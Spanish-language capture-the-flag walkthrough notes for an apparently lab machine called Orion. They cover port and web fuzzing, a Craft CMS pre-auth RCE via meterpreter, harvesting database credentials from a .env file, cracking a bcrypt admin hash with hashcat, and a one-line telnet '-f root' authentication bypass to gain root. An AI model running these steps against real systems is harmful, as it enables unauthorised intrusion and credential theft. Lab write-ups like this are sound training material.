# Orion
- nmap -sCV -Pn -n  10.129.104.22
- 22 ssh -> 80http
- 10.129.104.22 -> te redirige a http://orion.htb/
- sudo nano /etc/hosts para añadirlo en nuestra resolución local de dns
- Ahora si carga la web correctamente
- fuzeamos -> ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
- /admin , /assets , /index.html , /index.php , /logout
- http://orion.htb/admin/login nos salta el login admin.
- Identificamos el CMS  Craft CMS 5.6.16 en el panel de login.
- Craft CMS 5.6.16  default credentials -> no hay
- Craft CMS 5.6.16 unautehnticated exploit -> CVE-2025-32432 — Craft CMS pre-auth RCE


- Accedemos con meterpreter y invocamos una shell -> vamos al directorio www-data y entramos en craft -> ls -la vemos .env y aqui suelen haber credenciales.
- CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
- CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
- nos conectamos a mysql -> mysql -u root -p orion
- investigamos db y tablas y vemos users la leemos -> | 1 | NULL |NULL |1 | 0 |0 | 0 | 1 | admin| NULL| NULL | NULL | adam@orion.htb |
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
- Adam tiene la pw hasheada de admin (es admin) -> desencriptamos hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt (bcrypt)
- darkangel ssh adam@10.129.104.22 -> leemos lfag user en directortio
- sudo -l no esta permitido y en suid no veo nada raro.
- netstat -tulnp y vemos que tiene abierto el puerto 23 telnet --version y vemos una version vulnerable a CVE-2026-24061
- USER="-f root" telnet -a 127.0.0.1 y somos root :)
